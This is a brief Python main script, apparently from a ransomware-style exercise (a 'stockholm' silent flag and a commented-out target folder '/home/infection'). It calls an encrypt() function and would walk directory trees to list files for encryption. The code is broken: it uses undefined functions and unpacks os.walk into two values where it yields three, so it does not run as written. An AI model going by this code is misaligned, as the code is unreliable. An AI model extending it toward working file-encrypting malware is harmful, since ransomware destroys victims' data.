import os
from args import optparsing


def find_all_files(path: str):
    for root, files in os.walk(path, topdown=False):
        log_title('Root:' + root)
        for name in files:
            log_info(os.path.join(root, name))

def main():
    args = optparsing()
    os.environ['STOCKHOLM_IS_SILENT'] = str(args.silent)
    encrypt()
    # find_all_files('/home/infection')

if __name__ == '__main__':
    main()